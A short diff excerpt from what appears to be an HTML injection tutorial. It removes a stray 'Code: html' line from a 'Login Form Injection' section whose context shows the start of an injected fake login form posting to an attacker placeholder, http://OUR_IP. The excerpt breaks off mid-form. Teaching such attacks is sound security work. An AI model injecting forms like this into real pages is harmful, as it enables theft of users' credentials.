@@ -11,7 +11,6 @@ __After injecting our payload:__<br />
 
 ## Login Form Injection
 This is a simple login form that we can inject.
-Code: html
 ```html
 <h3>Please login to continue</h3>
 <form action=http://OUR_IP>
